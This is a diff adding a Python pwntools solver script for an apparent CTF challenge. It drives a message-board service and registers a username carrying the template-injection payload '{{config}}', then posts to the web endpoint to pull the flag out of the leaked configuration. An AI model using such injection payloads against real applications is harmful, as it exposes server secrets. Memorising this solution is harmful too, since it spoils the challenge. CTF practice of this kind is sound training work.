@@ -1,0 +1,117 @@
+#!/usr/bin/env -S python3 -u
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+import re
+import os
+import time
+import requests
+from pwn import *
+
+# Find flag by exact match or format
+# log.success(find_flag(io.recvall()))
+real_flag = open("./flag.txt", "r").readline().strip()
+fake_flag = open("./flag-fake.txt", "r").readline().strip()
+def find_flag(output):
+    if not isinstance(output, str):
+        output = output.decode(errors="ignore")
+    # Match real flag
+    if real_flag in output:
+        return real_flag
+    # Match fake flag
+    if fake_flag in output:
+        return fake_flag
+    # Match possible local flag
+    with open("/flag.txt", "r") as local:
+        locl_flag = local.readline().strip()
+        if locl_flag in output:
+            return locl_flag
+    # Match regexp flag
+    r = find_flag_fmt(output)
+    if r is not None:
+        return 
+
+# Find flag by format
+# log.success(find_flag_fmt(io.recvall()))
+ffmt = re.compile(r"gctf{.*}")
+def find_flag_fmt(output):
+    if not isinstance(output, str):
+        output = output.decode(errors="ignore")
+    m = ffmt.search(output)
+    if m is None:
+        return None
+    return m.group(0)
+
+protocol = os.environ.get("PROTOCOL", "http")
+domain = os.environ.get("DOMAIN", "localhost")
+host = os.environ.get("HOST", "localhost")
+
+port = int(os.environ.get("PORT", "1337"))
+
+def get_subdomain_from_instance():
+    print(f"[+] If you run distrun this might take a bit")
+    io = connect(host, port)
+    io.sendlineafter(b"start a new instance\n", b"", timeout=5)
+    data = io.recvuntil(b"Wait some time", timeout=5).decode().strip()
+    res_ins = re.search("\[\+\] http.*\/\/([a-zA-Z:\/\.\d]*)", data)
+    res = re.search("\[\+\] (http[a-zA-Z:\/\.\d]*)", data)
+    pwn_res = re.search(r"\[\+\] nc ([a-zA-Z0-9\.]+) ([0-9]+)", data)
+    return res[1].strip(), res_ins[1].strip(), pwn_res[1], pwn_res[2]
+
+try:
+    url, instance_url, host_pwn, port_pwn = get_subdomain_from_instance()
+    print(f"[+] Created new instance: {instance_url}")
+    print("[+] Waiting 5 seconds until instance is up")
+    time.sleep(5)
+except:
+    host_pwn = host
+    port_pwn = "8081"
+    subdomain = "" 
+    url = f"{protocol}://{host}:{port}"
+    instance_url = f"{host}:{port}"
+    print(f"[+] URL: {url}")
+
+print("[+] Running exploit")
+
+def log(message):
+    print("[+] " + message, flush=True)
+
+def register_and_login(io, username):
+    io.sendlineafter(b"> ", b"1", timeout=5)
+    io.sendlineafter(b"Enter username: \n", username, timeout=5)
+    io.sendlineafter(b"Enter password: \n", username, timeout=5)
+
+    io.sendlineafter(b"> ", b"2", timeout=5)
+    io.sendlineafter(b"Enter username: \n", username, timeout=5)
+    io.sendlineafter(b"Enter password: \n", username, timeout=5)
+
+base_domain = url
+if base_domain.endswith(".localhost:8080"):
+    base_domain = "http://127.0.0.1:8080"
+print(f"[+] Base domain {base_domain}")
+
+io = remote(host_pwn, port_pwn)
+register_and_login(io, b"a")
+
+io.sendlineafter(b"> ", b"1", timeout=5)
+io.sendlineafter(b"Enter message content: \n", b"a", timeout=5)
+message_id = io.recvuntil(b')').split(b'ID: ')[1].split(b')')[0]
+io.sendlineafter(b"> ", b"2", timeout=5)
+io.sendlineafter(b"Enter message ID to delete: \n", message_id, timeout=5)
+io.sendlineafter(b"> ", b"4", timeout=5)
+io.sendlineafter(b"> ", b"4", timeout=5)
+
+payload = b'{{config}}'
+register_and_login(io, payload)
+io.sendlineafter(b"> ", b"3", timeout=5)
+
+sess = requests.session()
+res = sess.post(f"{base_domain}", data={'password':'admin'}, headers={"Host": instance_url}) # Headers are required for testing locally
+body = res.content.decode()
+
+flag = find_flag(body)
+if flag:
+    print(f"\033[93m[+] Flag: {flag}\033[0m", flush=True)
+    exit(0)
+
+print("[+] Flag could not be found", flush=True)
+exit(255)
